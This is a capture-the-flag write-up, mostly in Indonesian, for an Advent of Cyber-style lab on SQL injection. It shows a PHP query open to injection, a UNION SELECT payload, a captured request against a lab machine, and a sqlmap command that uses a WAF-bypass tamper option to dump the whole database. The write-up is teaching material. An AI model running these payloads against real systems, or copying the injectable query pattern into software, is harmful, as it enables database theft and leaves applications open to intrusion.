# Day 5 | Someone stole Santa's gift list!

`Web Exploitation` `SQLi`

---

## Learning Outcomes

- Understanding how SQLi works
- Understanding how to use SQLMap to exploit a web that vulnerable to SQLi automatically

## Summary

- Find and visit a login panel
- Bypass the login panel using SQLi
- Once you logged in, there's a search box, use SQLi to retrieve flag and admin password from it.


## Write up

Pada task kali ini yang dipelajari adalah dasar sql injection.

Sedikit pembahasan, pada aplikasi-aplikasi yang menggunakan database, biasanya terdapat suatu hardcoded dari SQL kueri. Hal tersebut tentunya digunakan dalam pemrosesan data user, pencarian product, dsb dari database.

Sebagai contoh: 

```
<?php
    $username = $_GET['username'];
    $result = mysql_query("SELECT * FROM users WHERE username='$username'");
?>
```
Dari kode diatas, kita mempunyai kontrol terhadap variabel `$username` karena variable ini di *passing* melalui metode GET request. 

Apa jadinya jika input yang diberikan bukan merupakan <u>username</u>, melainkan tanda `'` ?.

```
$username = '
$result = mysql_query("SELECT * FROM users WHERE username='''");
```

Setelah sedikit pengenalan SQLi diatas, writeup akan mengikuti Challenge yang diberikan, yaitu: 

```
Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6. 
Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment
```

Berikut tampilan dari mesin yang di deploy :

![5929b9e7c4a151e4d09e8e9653ab5743.png](./_resources/afdc4d64470b4119b8abdfea43219b48.png)

Login panelnya berada pada  `/santapanel`, dan berhasil di bypass menggunakan salah satu payload yang ada di link berikut:  

[Payload All The Things](
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

[SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list)

Berikut adalah tampilan setelah login

![20e489986723fdb5d5f3b97c4499ce61.png](./_resources/21cb54862e3e4aa78c1d8d30ebbc04ee.png)

Pada search box tersebut, injeksi kueri SQL dapat dilakukan, berikut contoh payload yang digunakan.

```
' UNION SELECT NULL,NULL--
```
Hasilnya :

![518302d9e5b9b10a1adf7680a4a287b3.png](./_resources/e0344168037247eda7eacbfb76322146.png)

Selanjutnya akan digunakan tools bernama SQLMap untuk melakukan injeksi kueri sql secara otomatis.

Berikut ini adalah contoh request yang diintersep oleh BurpSuite, disimpan dengan nama **req**.
```
GET /santapanel?search=test HTTP/1.1
Host: 10.10.98.46:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http:/10.10.98.46:8000/santapanel?search=test
Cookie: session=eyJhdXRoIjp0cnVlfQ.X8wN5w.1Ja1P_I4nmcANhJKMUx5dTa7fCQ
Upgrade-Insecure-Requests: 1
```

> Cheatsheet SQLMap  :
- https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
- https://github.com/sqlmapproject/sqlmap/wiki/Usage

SQLMap dapat membaca request yang diintersep oleh BurpSuite dan menentukan parameter yang mungkin dapat di injeksi dengan menambahkan opsi `-r [nama file]`.

Berdasarkan Challenge, maka susunan SQLmap dan opsinya seperti berikut.

```
sqlmap -r req --tamper=space2comment --dump-all --dbms sqlite --batch
```
Berikut hasilnya:

![5cc874e47b629a01470b7bf86230c0f0.png](./_resources/c5e5e436f2774a4da98314bc38020e5f.png)

![166507cf29fc21d0ab4316e64cd3431a.png](./_resources/5f5cb88db6f74013bfb1a8e1d5c5f2ed.png)

![4e0c5218ef1aa44e8c5a94d7aeff85a5.png](./_resources/1097ea7cf66e454ca6e9e2ab7d0d46d5.png)


